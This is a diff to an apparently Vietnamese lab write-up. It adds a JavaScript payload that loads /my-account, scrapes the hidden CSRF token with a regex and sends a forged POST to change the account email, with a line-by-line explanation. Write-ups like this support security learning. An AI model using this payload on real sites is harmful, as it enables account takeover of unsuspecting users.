@@ -834,17 +834,33 @@ Inspect code:
 Code:
 ```html
 <script>
-    
-    fetch('/my-account/change-email',{
-        method: 'POST',
-        body: new URLSearchParams({
-            email: 'abc@gmail.com',
-            csrf: csrfToken
-        })
-    });
+    var req = new XMLHttpRequest();
+    req.onload = handleResponse;
+    req.open('get', '/my-account', true);
+    req.send();
+
+    function handleResponse() {
+        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+        var changeReq = new XMLHttpRequest();
+        changeReq.open('post', '/my-account/change-email', true);
+        changeReq.send('csrf='+token+'&email=test@test.com')
+    };
 </script>
 ```
 
+- Tạo một đối tượng `XMLHttpRequest`, dùng để gửi request HTTP từ `JavaScript` (AJAX).
+- Biến `req` sẽ được dùng để gửi request đến server.
+- Gán hàm `handleResponse` để xử lý khi request kết thúc **(trạng thái readyState == 4)**.
+- Tức là khi `/my-account` phản hồi HTML, `handleResponse()` sẽ được gọi.
+- `open(method, url, async)` khởi tạo request kiểu GET đến URL `/my-account`, bất đồng bộ (true).
+- `send()` thực sự gửi yêu cầu.
+- Lấy `csrf` ẩn
+    - **this.responseText**: là nội dung HTML của trang `/my-account`
+    - `.match(...)`: dùng regex để tìm đoạn:
+    ```html
+    name="csrf" value="TOKEN"
+    ```
+- Gửi request POST giả mạo với token hợp lệ
 
 ---
 Goodluck! 🍀🍀🍀
